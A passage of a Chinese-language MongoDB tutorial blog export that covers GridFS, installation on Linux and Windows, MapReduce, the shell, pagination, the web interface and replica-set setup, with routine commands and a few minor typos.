    <content><![CDATA[<h2 id="GridFS"><a href="#GridFS" class="headerlink" title="GridFS"></a>GridFS</h2><p>用于存储和恢复那些超过16M（BSON文件限制）的文件(如：图片、音频、视频等)。</p>
<p>GridFS 也是文件存储的一种方式，但是它是存储在MonoDB的集合中。</p>
<p>GridFS 可以更好的存储大于16M的文件。</p>
<p>GridFS<br>会将大文件对象分割成多个小的chunk(文件片段),一般为256k&#x2F;个,每个chunk将作为MongoDB的一个文档(document)被存储在chunks集合中。</p>
<p>GridFS 用两个集合来存储一个文件：fs.files与fs.chunks。</p>
<p>每个文件的实际内容被存在chunks(二进制数据)中,和文件有关的meta数据(filename,content_type,还有用户自定义的属性)将会被存在files集合中。</p>
<p>以下是简单的 fs.files 集合文档：</p>
<pre><code>&#123;
   &quot;filename&quot;: &quot;test.txt&quot;,
   &quot;chunkSize&quot;: NumberInt(261120),
   &quot;uploadDate&quot;: ISODate(&quot;2014-04-13T11:32:33.557Z&quot;),
   &quot;md5&quot;: &quot;7b762939321e146569b07f72c62cca4f&quot;,
   &quot;length&quot;: NumberInt(646)
&#125;
</code></pre>
<p>以下是简单的 fs.chunks 集合文档：</p>
<pre><code>&#123;
   &quot;files_id&quot;: ObjectId(&quot;534a75d19f54bfec8a2fe44b&quot;),
   &quot;n&quot;: NumberInt(0),
   &quot;data&quot;: &quot;Mongo Binary Data&quot;
&#125;
</code></pre>
<h2 id="GridFS-添加文件"><a href="#GridFS-添加文件" class="headerlink" title="GridFS 添加文件"></a>GridFS 添加文件</h2><p>现在我们使用 GridFS 的 put 命令来存储 mp3 文件。调用 MongoDB<br>安装目录下bin的 mongofiles.exe工具。</p>
<p>打开命令提示符，进入到MongoDB的安装目录的bin目录中，找到mongofiles.exe，并输入下面的代码：</p>
<pre><code>&gt;mongofiles.exe -d gridfs put song.mp3
</code></pre>
<p>GridFS<br>是存储文件的数据名称。如果不存在该数据库，MongoDB会自动创建。Song.mp3<br>是音频文件名。</p>
<p>使用以下命令来查看数据库中文件的文档：</p>
<pre><code>&gt;db.fs.files.find()
</code></pre>
<p>以上命令执行后返回以下文档数据：</p>
<pre><code>&#123;
   _id: ObjectId(&#39;534a811bf8b4aa4d33fdf94d&#39;), 
   filename: &quot;song.mp3&quot;, 
   chunkSize: 261120, 
   uploadDate: new Date(1397391643474), md5: &quot;e4f53379c909f7bed2e9d631e15c1c41&quot;,
   length: 10401959 
&#125;
</code></pre>
<p>我们可以看到 fs.chunks 集合中所有的区块，以下我们得到了文件的 _id<br>值，我们可以根据这个 _id 获取区块(chunk)的数据：</p>
<pre><code>&gt;db.fs.chunks.find(&#123;files_id:ObjectId(&#39;534a811bf8b4aa4d33fdf94d&#39;)&#125;)
</code></pre>
<p>以上实例中，查询返回了 40<br>个文档的数据，意味着mp3文件被存储在40个区块中。</p>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux平台安装MongoDB</title>
    <url>/blog/nosql/mongodb/installlinux/</url>
    <content><![CDATA[<p>MongoDB提供了linux平台上32位和64位的安装包，你可以在官网下载安装包。</p>
<p>下载地址：<a href="https://www.mongodb.org/downloads#production">https://www.mongodb.org/downloads#production</a></p>
<p><img src="/images/mongodb/MongoDB-Linux.jpg"></p>
<p>下载完安装包，并解压 <strong>tgz</strong>（以下演示的是 64 位 Linux上的安装） 。</p>
<pre><code>curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.0.6.tgz# 下载
tar -zxvf mongodb-linux-x86_64-3.0.6.tgz  # 解压

mv  mongodb-linux-x86_64-3.0.6/ /usr/local/mongodb # 将解压包拷贝到指定目录
</code></pre>
<p>MongoDB 的可执行文件位于 bin 目录下，所以可以将其添加到 <strong>PATH</strong>路径中：</p>
<pre><code>export PATH=/bin:$PATH
</code></pre>
<p>**** 为你 MongoDB 的安装路径。如本文的 <strong>&#x2F;usr&#x2F;local&#x2F;mongodb</strong> 。</p>
<h2 id="创建数据库目录"><a href="#创建数据库目录" class="headerlink" title="创建数据库目录"></a>创建数据库目录</h2><p>MongoDB的数据存储在data目录的db目录下，但是这个目录在安装过程不会自动创建，所以你需要手动创建data目录，并在data目录中创建db目录。</p>
<p>以下实例中我们将data目录创建于根目录下(&#x2F;)。</p>
<p>注意：&#x2F;data&#x2F;db 是 MongoDB 默认的启动的数据库路径(–dbpath)。</p>
<pre><code>mkdir -p /data/db
</code></pre>
<h2 id="命令行中运行-MongoDB-服务"><a href="#命令行中运行-MongoDB-服务" class="headerlink" title="命令行中运行 MongoDB 服务"></a>命令行中运行 MongoDB 服务</h2><p>你可以再命令行中执行mongo安装目录中的bin目录执行mongod命令来启动mongdb服务。</p>
<blockquote>
<p>注意：如果你的数据库目录不是&#x2F;data&#x2F;db，可以通过 –dbpath 来指定。</p>
</blockquote>
<pre><code>$ ./mongod
</code></pre>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB Map Reduce</title>
    <url>/blog/nosql/mongodb/mapreduce/</url>
    <content><![CDATA[<p>Map-Reduce是一种计算模型，简单的说就是将大批量的工作（数据）分解（MAP）执行，然后再将结果合并成最终结果（REDUCE）。</p>
<p>MongoDB提供的Map-Reduce非常灵活，对于大规模数据分析也相当实用。</p>
<h2 id="MapReduce-命令"><a href="#MapReduce-命令" class="headerlink" title="MapReduce 命令"></a>MapReduce 命令</h2><p>以下是MapReduce的基本语法：</p>
<pre><code>&gt;db.collection.mapReduce(
   function() &#123;emit(key,value);&#125;,  //map 函数
   function(key,values) &#123;return reduceFunction&#125;,   //reduce 函数
   &#123;
      out: collection,
      query: document,
      sort: document,
      limit: number
   &#125;
)
</code></pre>
<p>使用 MapReduce 要实现两个函数 Map 函数和 Reduce 函数,Map 函数调用<br>emit(key, value),遍历 collection 中所有的记录, 将key 与 value 传递给<br>Reduce 函数进行处理。</p>
<p>Map 函数必须调用 emit(key, value) 返回键值对。</p>
<p>参数说明:</p>
<ul>
<li><strong>map</strong> ：映射函数 (生成键值对序列,作为 reduce 函数参数)。</li>
<li><strong>reduce</strong><br>统计函数，reduce函数的任务就是将key-values变成key-value，也就是把values数组变成一个单一的值value。。</li>
<li><strong>out</strong> 统计结果存放集合<br>(不指定则使用临时集合,在客户端断开后自动删除)。</li>
<li><strong>query</strong><br>一个筛选条件，只有满足条件的文档才会调用map函数。（query。limit，sort可以随意组合）</li>
<li><strong>sort</strong><br>和limit结合的sort排序参数（也是在发往map函数前给文档排序），可以优化分组机制</li>
<li><strong>limit</strong><br>发往map函数的文档数量的上限（要是没有limit，单独使用sort的用处不大）</li>
</ul>
<h2 id="使用-MapReduce"><a href="#使用-MapReduce" class="headerlink" title="使用 MapReduce"></a>使用 MapReduce</h2><p>考虑以下文档结构存储用户的文章，文档存储了用户的 user_name 和文章的<br>status 字段：</p>
<pre><code>&gt;db.posts.insert(&#123;
   &quot;post_text&quot;: &quot;菜鸟教程，最全的技术文档。&quot;,
   &quot;user_name&quot;: &quot;mark&quot;,
   &quot;status&quot;:&quot;active&quot;
&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;db.posts.insert(&#123;
   &quot;post_text&quot;: &quot;菜鸟教程，最全的技术文档。&quot;,
   &quot;user_name&quot;: &quot;mark&quot;,
   &quot;status&quot;:&quot;active&quot;
&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;db.posts.insert(&#123;
   &quot;post_text&quot;: &quot;菜鸟教程，最全的技术文档。&quot;,
   &quot;user_name&quot;: &quot;mark&quot;,
   &quot;status&quot;:&quot;active&quot;
&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;db.posts.insert(&#123;
   &quot;post_text&quot;: &quot;菜鸟教程，最全的技术文档。&quot;,
   &quot;user_name&quot;: &quot;mark&quot;,
   &quot;status&quot;:&quot;active&quot;
&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;db.posts.insert(&#123;
   &quot;post_text&quot;: &quot;菜鸟教程，最全的技术文档。&quot;,
   &quot;user_name&quot;: &quot;mark&quot;,
   &quot;status&quot;:&quot;disabled&quot;
&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;db.posts.insert(&#123;
   &quot;post_text&quot;: &quot;菜鸟教程，最全的技术文档。&quot;,
   &quot;user_name&quot;: &quot;runoob&quot;,
   &quot;status&quot;:&quot;disabled&quot;
&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;db.posts.insert(&#123;
   &quot;post_text&quot;: &quot;菜鸟教程，最全的技术文档。&quot;,
   &quot;user_name&quot;: &quot;runoob&quot;,
   &quot;status&quot;:&quot;disabled&quot;
&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;db.posts.insert(&#123;
   &quot;post_text&quot;: &quot;菜鸟教程，最全的技术文档。&quot;,
   &quot;user_name&quot;: &quot;runoob&quot;,
   &quot;status&quot;:&quot;active&quot;
&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
</code></pre>
<p>现在，我们将在 posts 集合中使用 mapReduce<br>函数来选取已发布的文章(status:”active”)，并通过user_name分组，计算每个用户的文章数：</p>
<pre><code>&gt;db.posts.mapReduce( 
   function() &#123; emit(this.user_name,1); &#125;, 
   function(key, values) &#123;return Array.sum(values)&#125;, 
      &#123;  
         query:&#123;status:&quot;active&quot;&#125;,  
         out:&quot;post_total&quot; 
      &#125;
)
</code></pre>
<p>以上 mapReduce 输出结果为：</p>
<pre><code>&#123;
        &quot;result&quot; : &quot;post_total&quot;,
        &quot;timeMillis&quot; : 23,
        &quot;counts&quot; : &#123;
                &quot;input&quot; : 5,
                &quot;emit&quot; : 5,
                &quot;reduce&quot; : 1,
                &quot;output&quot; : 2
        &#125;,
        &quot;ok&quot; : 1
&#125;
</code></pre>
<p>结果表明，共有4个符合查询条件（status:”active”）的文档，在map函数中生成了4个键值对文档，最后使用reduce函数将相同的键值分为两组。</p>
<p>具体参数说明：</p>
<ul>
<li>result：储存结果的collection的名字,这是个临时集合，MapReduce的连接关闭后自动就被删除了。</li>
<li>timeMillis：执行花费的时间，毫秒为单位</li>
<li>input：满足条件被发送到map函数的文档个数</li>
<li>emit：在map函数中emit被调用的次数，也就是所有集合中的数据总量</li>
<li>ouput：结果集合中的文档个数**<span
style="color:#ff0000">（count对调试非常有帮助）</span>**</li>
<li>ok：是否成功，成功为1</li>
<li>err：如果失败，这里可以有失败原因，不过从经验上来看，原因比较模糊，作用不大</li>
</ul>
<p>使用 find 操作符来查看 mapReduce 的查询结果：</p>
<pre><code>&gt;db.posts.mapReduce( 
   function() &#123; emit(this.user_name,1); &#125;, 
   function(key, values) &#123;return Array.sum(values)&#125;, 
      &#123;  
         query:&#123;status:&quot;active&quot;&#125;,  
         out:&quot;post_total&quot; 
      &#125;
).find()
</code></pre>
<p>以上查询显示如下结果，两个用户 tom 和 mark 有两个发布的文章:</p>
<pre><code>&#123; &quot;_id&quot; : &quot;mark&quot;, &quot;value&quot; : 4 &#125;
&#123; &quot;_id&quot; : &quot;runoob&quot;, &quot;value&quot; : 1 &#125;
</code></pre>
<p>用类似的方式，MapReduce可以被用来构建大型复杂的聚合查询。</p>
<p>Map函数和Reduce函数可以使用 JavaScript<br>来实现，是的MapReduce的使用非常灵活和强大。</p>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB后台管理 Shell</title>
    <url>/blog/nosql/mongodb/mongoshell/</url>
    <content><![CDATA[<p>如果你需要进入MongoDB后台管理，你需要先打开mongodb装目录的下的bin目录，然后执行mongo.exe文件，MongoDB Shell是MongoDB自带的交互式Javascript shell,用来对MongoDB进行操作和管理的交互式环境。</p>
<p>当你进入mongoDB后台后，它默认会链接到 test 文档（数据库）：</p>
<pre><code>&gt; mongo
MongoDB shell version: 3.0.6
connecting to: test
……
</code></pre>
<p>由于它是一个JavaScript shell，您可以运行一些简单的算术运算:</p>
<pre><code>&gt; 2 + 2
4
&gt;
</code></pre>
<p><strong>db</strong> 命令用于查看当前操作的文档（数据库）：</p>
<pre><code>&gt; db
test
&gt;
</code></pre>
<p>插入一些简单的记录并查找它：</p>
<pre><code>&gt; db.runoob.insert(&#123;x:10&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.runoob.find()
&#123; &quot;_id&quot; : ObjectId(&quot;5604ff74a274a611b0c990aa&quot;), &quot;x&quot; : 10 &#125;
&gt;
</code></pre>
<p>第一个命令将数字 10 插入到 runoob 集合的 x 字段中。</p>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 分页与排序</title>
    <url>/blog/nosql/mongodb/pagesort/</url>
    <content><![CDATA[<h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>如果你需要在MongoDB中读取指定数量的数据记录，可以使用MongoDB的Limit方法，limit()方法接受一个数字参数，该参数指定从MongoDB中读取的记录条数。</p>
<p>limit()方法基本语法如下所示：</p>
<pre><code>&gt;db.COLLECTION_NAME.find().limit(NUMBER)
</code></pre>
<p>示例：</p>
<pre><code>&gt; db.col.find(&#123;&#125;,&#123;&quot;title&quot;:1,_id:0&#125;).limit(2)
</code></pre>
<p>我们除了可以使用limit()方法来读取指定数量的数据外，还可以使用skip()方法来跳过指定数量的数据，skip方法同样接受一个数字参数作为跳过的记录条数。</p>
<p>skip() 方法脚本语法格式如下：</p>
<pre><code>&gt;db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER)
</code></pre>
<p>示例：</p>
<pre><code>&gt;db.col.find(&#123;&#125;,&#123;&quot;title&quot;:1,_id:0&#125;).limit(1).skip(1)
</code></pre>
<p>limit配合skip可以完成分页功能。</p>
<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>在MongoDB中使用使用sort()方法对数据进行排序，sort()方法可以通过参数指定排序的字段，并使用1 和 -1 来指定排序的方式，其中 1 为升序排列，而-1是用于降序排列。</p>
<p>sort()方法基本语法如下所示：</p>
<pre><code>&gt;db.COLLECTION_NAME.find().sort(&#123;KEY:1&#125;)
</code></pre>
<p>示例：</p>
<pre><code>&gt;db.col.find(&#123;&#125;,&#123;&quot;title&quot;:1,_id:0&#125;).sort(&#123;&quot;likes&quot;:-1&#125;)
</code></pre>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDb web 用户界面</title>
    <url>/blog/nosql/mongodb/mongodbweb/</url>
    <content><![CDATA[<p>MongoDB 提供了简单的 HTTP 用户界面。</p>
<p>如果你想启用该功能，需要在启动的时候指定参数 –rest 。</p>
<pre><code>$ ./mongod --dbpath=/data/db --rest
</code></pre>
<p>MongoDB 的 Web 界面访问端口比服务的端口多1000。</p>
<p>如果你的MongoDB运行端口使用默认的27017，你可以在端口号为28017访问web用户界面，即地址为：<a href="http://localhost:28017。">http://localhost:28017。</a></p>
<p><img src="/images/mongodb/mongodb-web.png"></p>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 复制（副本集）</title>
    <url>/blog/nosql/mongodb/replset/</url>
    <content><![CDATA[<p>MongoDB复制是将数据同步在多个服务器的过程。</p>
<p>复制提供了数据的冗余备份，并在多个服务器上存储数据副本，提高了数据的可用性，并可以保证数据的安全性。</p>
<p>复制还允许您从硬件故障和服务中断中恢复数据。</p>
<h2 id="为什么需要复制"><a href="#为什么需要复制" class="headerlink" title="为什么需要复制?"></a>为什么需要复制?</h2><ul>
<li>保障数据的安全性</li>
<li>数据高可用性 (24*7)</li>
<li>灾难恢复</li>
<li>无需停机维护（如备份，重建索引，压缩）</li>
<li>分布式读取数据</li>
</ul>
<h2 id="MongoDB复制原理"><a href="#MongoDB复制原理" class="headerlink" title="MongoDB复制原理"></a>MongoDB复制原理</h2><p>mongodb的复制至少需要两个节点。其中一个是主节点，负责处理客户端请求，其余的都是从节点，负责复制主节点上的数据。</p>
<p>mongodb各个节点常见的搭配方式为：一主一从、一主多从。</p>
<p>主节点记录在其上的所有操作oplog，从节点定期轮询主节点获取这些操作，然后对自己的数据副本执行这些操作，从而保证从节点的数据与主节点一致。</p>
<p>MongoDB复制结构图如下所示：</p>
<p><img src="/images/mongodb/replication.png" alt="MongoDB复制结构图"></p>
<p>以上结构图总，客户端总主节点读取数据，在客户端写入数据到主节点是，主节点与从节点进行数据交互保障数据的一致性。</p>
<h2 id="一般主从复制"><a href="#一般主从复制" class="headerlink" title="一般主从复制"></a>一般主从复制</h2><p>主服务添加启动参数”–master”，从服务器添加启动参数”–slave”。</p>
<p>从服务器会从local数据库，sources数据集中找主服务器配制进行同步操作。</p>
<p>主服务器的信息可以有多条，因为可以从不同的服务器同步不同的数据库，这是通过only参数指定的。多个主节点的集合如果相同，MongoDB会尝试合并，但不会保证合并的正确性！所以尽量在多个主节点上使用不同的命名空间！</p>
<p>如下：</p>
<pre><code>&gt; db.sources.insert(&#123;&quot;host&quot;:&quot;localhost:10000&quot;, &quot;only&quot;:&quot;testdb&quot;&#125;);  
</code></pre>
<p>可以从启动参数设置主服务器，用参数”–source&#x3D;hostname:port”。在第一次启动后信息会记录在local.sources中，以后启动就不需要了。如果主服务记录要更改要连接到服务器上对文档进行更改。</p>
<p>其它参数：</p>
<p>–slavedelay<br>：这个选项用在启动从服务器上，指定从服务器从主服务器上同步操作的延时时间，这对于一些无意的删除重要数据或插入垃圾数据有一定的防护作用，通过延时，可暂缓这些不良操作在从服务器上被执行！</p>
<p>–fastsync<br>：这个选项用在启动从服务器上。表明以主服务器节点的数据快照为基础启动从服务器节点。因为从服务节点启动后，要先完整同步主服务节点上的数据，然后再获取主服务节点的oplog来保持后续的同步。使用这个启动参数，从服务器节点的启动要比完整同步快很多！</p>
<p>–autoresync<br>：这个选项用在启动从服务器节点上。如果从节点与主节点不同步了，则自动重新同步。</p>
<p>–oplogSize<br>：启动主服务器时显示指定放置oplog的集合所占据的空间大小。MongoDB有一个默认的规则（磁盘分区剩余空间的5%，上篇有提及），这个选项可以优于这个规则来显示指定。</p>
<p>【autoresync选项详细解释】</p>
<p>使用这个选项启动从服务器，当从服务器停止同步时，会自动启动重新完整同步操作。那从服务器什么情况会停止同步呢？从节点启动时，都会首先进行完整同步，然后再读取主节点的oplog保持数据同步。如果此时主节点数据太多，且写操作频繁，会导致从节点跟不上主节点的操作，有可能当完整同步完成，oplog已经绕了一圈了（固定集合）。这时从节点会停止同步，此时我们可以手动在从节点上执行命令db.runCommand({“resync”<br>:<br>1})来强制从节点再进行一遍完整同步，使用–autoresync选项启动的从节点这时会自动重新进行一遍完整同步！完整同步代价比较高，应尽量避免，较好的方式就是设置足够大的oplog！</p>
<p>启动主服务：</p>
<pre><code>./mongodb --dbpath ~/dbs/master --port 8000 --master
</code></pre>
<p>启动从服务：</p>
<pre><code>./mongodb --dbpath ~/dbs/slave --port 8001 --slave --source 127.0.0.1:8000
</code></pre>
<p>如果不设置source参数，启动后会提示如下信息，因为设置了slave参数：</p>
<pre><code>[replslave] no source given, add a master to local.sources to start replication
</code></pre>
<p>可以通过客户端连接上在local.sources里插入文档进行主服务器配制。</p>
<p>如下：</p>
<pre><code>&gt; db.sources.insert(&#123;&quot;host&quot;:&quot;localhost:10000&quot;&#125;);  
</code></pre>
<h2 id="副本集"><a href="#副本集" class="headerlink" title="副本集"></a>副本集</h2><p>先说一下副本集的概念：有自动故障恢复功能的主从结构！前面讲到的主从结构和副本集最大的区别就是：副本集没有固定的“主节点”，整个集群结构会动态选举出一个“主节点”，当其不能工作了，则会动态变更到其他节点。副本集对其节点又特殊的称呼：活跃节点（“主节点”）和<br>备份节点（“从节点”）。</p>
<p><strong>副本集特征：</strong></p>
<ul>
<li>N 个节点的集群</li>
<li>任何节点可作为主节点</li>
<li>所有写入操作都在主节点上</li>
<li>自动故障转移</li>
<li>自动恢复</li>
</ul>
<p>副本集最美妙的地方是其自动化，在当前活跃节点因故障停止时，备份节点会自动升级为活跃节点！以维持系统的正常运行。</p>
<p>我们首先需要为副本集起一个名称，如比settest。</p>
<p>然后使用选项–replSet来起动三个数据库服务Instances(约定为一个复制集合）：</p>
<pre><code>./mongod --dbpath ~/dbs/node1 --port 10001 --replSet settest
./mongod --dbpath ~/dbs/node2 --port 10002 --replSet settest
./mongod --dbpath ~/dbs/node3 --port 10003 --replSet settest
</code></pre>
<p>集合中local.system.replset中没有任何配置信息，并且副本集还需要在shell中运行replSetInitiate命令来进行初始化。我们通过其中任意一台服务器运行命令初始化（注意该命令需要在admin数据库下执行），该集合中会自动插入配置信息，并且配置信息会在副本集内各个服务器间被复制：</p>
<pre><code>&gt; use admin
switched to db admin
&gt;rsconfig=&#123;
... &quot;_id&quot; : &quot;settest&quot;,
... &quot;members&quot; : [
...     &#123;
...         &quot;_id&quot; :1,
...         &quot;host&quot;: &quot;&lt; hostname&gt;&gt;:10001&quot;
...     &#125;,
...     &#123;
...         &quot;_id&quot; : 2,
...         &quot;host&quot; : &quot;&lt; hostname&gt;:10002&quot;
...     &#125;,
...     &#123;
...         &quot;_id&quot; : 3,
...         &quot;host&quot; : &quot;&lt; hostname&gt;:10003&quot;
...     &#125;
... ]&#125;
&gt; db.runCommand(&#123;&quot;replSetInitiate&quot; :rsconfig&#125;);
</code></pre>
<p>hostname为主机名，在一台机器上做测试都是一样的，当然用localhost或ip也可以，但不同的版本好像有的不行。</p>
<p>在新的版本中已经有了更简洁的命令rs.initiate,这是对replSetInitiate的包装：</p>
<pre><code>&gt;rs.initiate( rsconfig )
</code></pre>
<p>rs相关命令不需要在admin数据库下执行。</p>
<p>当然还可以分开操作：</p>
<pre><code>rs.initiate()
&gt;rs.add(&quot;&lt; hostname&gt;:10001&quot;)
&gt;rs.add(&quot;&lt; hostname&gt;:10002&quot;)
&gt;rs.add(&quot;&lt; hostname&gt;:10003&quot;)
</code></pre>
<p>如果设置成功，mongo的提示符会变成”副本集:PRIMARY&gt;”或”副本集:SECONDARY&gt;”格式，视连接的服务是主是从而定。</p>
<p>集群的配制只要配制一次，以后重启不用再次配制，因为都已经存储到数据库里了。</p>
<p>我们可以使用rs.conf()来查看副本集的配置。</p>
<p>查看副本集姿态使用 rs.status() 命令。</p>
<p>而且还可以用rs.add命令随时添加新成员。</p>
<p>MongoDB中你只能通过主节点将Mongo服务添加到副本集中，判断当前运行的Mongo服务是否为主节点可以使用命令db.isMaster()<br>。</p>
<h2 id="读扩展"><a href="#读扩展" class="headerlink" title="读扩展"></a>读扩展</h2><p>用MongoDB扩展读取的一种方式就是将查询放在从节点上，这样主节点的负载就会减轻。当负载是读取密集型时，这是一个不错的方案！扩展读取本身非常简单，像往常一样设置主从结构。唯一的技巧就是查询时显示指明查询选项slaveOkey，告诉从服务器是否可以处理请求（默认不可以）！所有的MongoDB驱动都会有一个机制来设置这个查询选项！</p>
<p>使用主从结构进行读扩展，我们必须清楚主从的数据同步有一定的时间间隙，如果不能承受这个间隙，就无法采用这个方案来减轻主节点数据查询的压力！</p>
<p>如果通过shell访问mongo，要在secondary进行查询。会出现如下错误：</p>
<pre><code>error: &#123; &quot;$err&quot; : &quot;not master and slaveOk=false&quot;, &quot;code&quot; : 13435 &#125;
</code></pre>
<p>有两种方法实现从机的查询：</p>
<p>第一种方法：db.getMongo().setSlaveOk();</p>
<p>第二种方法：rs.slaveOk();</p>
<p>但是这种方式有一个缺点就是，下次再通过mongo进入实例的时候，查询仍然会报错，为此可以通过下列方式</p>
<p>vi ~&#x2F;.mongorc.js</p>
<p>增加一行rs.slaveOk();这样的话以后每次通过mongo命令进入都可以查询了</p>
<p>如果是通过java访问secondary的话则会报下面的异常</p>
<pre><code>com.mongodb.MongoException: not talking to master and retries used up
</code></pre>
<p>解决方法：</p>
<p>第一种</p>
<pre><code>dbFactory.getDb().slaveOk();
</code></pre>
<p>第二种</p>
<p>在复制集中优先读secondary，如果secondary访问不了的时候就从master中读</p>
<pre><code>dbFactory.getDb().setReadPreference(ReadPreference.secondaryPreferred());
</code></pre>
<p>第三种</p>
<p>只从secondary中读，如果secondary访问不了的时候就不能进行查询</p>
<pre><code>dbFactory.getDb().setReadPreference(ReadPreference.secondary());
</code></pre>
<p>第四种</p>
<p>在配置mongo的时候增加slave-ok&#x3D;”true”也支持直接从secondary中读</p>
<pre><code>&lt; mongo:mongo id=&quot;mongo&quot; host=&quot;$&#123;mongodb.host&#125;&quot; port=&quot;$&#123;mongodb.port&#125;&quot;&gt;
        &lt; mongo:options slave-ok=&quot;true&quot;/&gt; 
</code></pre>
<h2 id="用从节点做数据处理源"><a href="#用从节点做数据处理源" class="headerlink" title="用从节点做数据处理源"></a>用从节点做数据处理源</h2><p>节点的另一个作用就是作为密集型数据处理的数据源，从而避免这种操作影响主节点的性能！此时我们启动从节点，需要同时使用–slave<br>和<br>–master选项（如果单纯使用–slave启动的从节点无法执行写操作），这样启动的从节点会从主节点同步数据，并且本身也可以同时进行读写操作！</p>
<p>使用这种技术时，我们必须保证不能对正在复制主节点数据的从节点上的数据库执行写入操作（从节点可以在不用进行同步的数据库上执行写操作）！从节点无法恢复这些操作，就不能正确映射主节点的数据了。</p>
<p>使用这种技术时，从节点第一次启动不能携带需要被复制的同名数据库（主节点上的），要是有的话，这个数据库就不能进行初始的完整同步操作了，只能进行后续的oplog操作！这样容易造成主从数据不一致！</p>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>window平台安装MongoDB</title>
    <url>/blog/nosql/mongodb/installwindows/</url>
    <content><![CDATA[<h2 id="MongoDB-下载"><a href="#MongoDB-下载" class="headerlink" title="MongoDB 下载"></a>MongoDB 下载</h2><p>MongoDB提供了可用于32位和64位系统的预编译二进制包，你可以从MongoDB官网下载安装，MongoDB预编译二进制包下载地址：<a href="https://www.mongodb.org/downloads#production">https://www.mongodb.org/downloads#production</a></p>
<blockquote>
<p>注意：在 MongoDB2.2 版本后已经不再支持 Windows XP 系统。</p>
</blockquote>
<p><img src="/images/mongodb/mongodb-download.jpg"></p>
<ul>
<li><strong>MongoDB for Windows 64-bit</strong> 适合 64 位的 Windows Server 2008 R2, Windows 7 , 及最新版本的 Window 系统。</li>
<li><strong>MongoDB for Windows 32-bit</strong> 适合 32 位的 Window 系统及最新的 Windows Vista。 32 位系统上 MongoDB 的数据库最大为 2GB。</li>
<li><strong>MongoDB for Windows 64-bit Legacy</strong> 适合 64 位的 Windows Vista, Windows Server 2003, 及 Windows Server 2008 。</li>
</ul>
<p>根据你的系统下载 32 位或 64 位的 .msi文件，下载后双击该文件，按操作提示安装即可。</p>
<p>安装过程中，你可以通过点击 “Custom(自定义)” 按钮来设置你的安装目录。</p>
<p><img src="/images/mongodb/win-install1.jpg"></p>
<p><img src="/images/mongodb/win-install2.jpg"></p>
<h2 id="命令行下运行-MongoDB-服务器"><a href="#命令行下运行-MongoDB-服务器" class="headerlink" title="命令行下运行 MongoDB 服务器"></a>命令行下运行 MongoDB 服务器</h2><p>为了从命令提示符下运行MongoDB服务器，你必须从MongoDB目录的bin目录中执行mongod.exe文件。</p>
<pre><code>mongod.exe --dbpath c:\data\db
</code></pre>
<p>MongoDB将数据目录存储在dbpath下，Windows中默认为”安装盘:\datadb”，linux默认为&#x2F;data&#x2F;db。</p>
<h2 id="将MongoDB服务器作为Windows服务运行"><a href="#将MongoDB服务器作为Windows服务运行" class="headerlink" title="将MongoDB服务器作为Windows服务运行"></a>将MongoDB服务器作为Windows服务运行</h2><p>请注意，你必须有管理权限才能运行下面的命令。执行以下命令将MongoDB服务器作为Windows服务运行：</p>
<pre><code>mongod.exe --bind_ip yourIPadress --logpath &quot;C:\data\dbConf\mongodb.log&quot; --logappend --dbpath &quot;C:\data\db&quot; --port yourPortNumber --serviceName &quot;YourServiceName&quot; --serviceDisplayName &quot;YourServiceName&quot; --install
</code></pre>
<p><strong>下表为mongodb启动的参数说明：</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>–bind_ip</td>
<td>绑定服务IP，若绑定127.0.0.1，则只能本机访问，不指定默认本地所有IP</td>
</tr>
<tr>
<td>–logpath</td>
<td>定MongoDB日志文件，注意是指定文件不是目录</td>
</tr>
<tr>
<td>–logappend</td>
<td>使用追加的方式写日志</td>
</tr>
<tr>
<td>–dbpath</td>
<td>指定数据库路径</td>
</tr>
<tr>
<td>–port</td>
<td>指定服务端口号，默认端口27017</td>
</tr>
<tr>
<td>–serviceName</td>
<td>指定服务名称</td>
</tr>
<tr>
<td>–serviceDisplayName</td>
<td>指定服务名称，有多个mongodb服务时执行。</td>
</tr>
<tr>
<td>–install</td>
<td>指定作为一个Windows服务安装。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
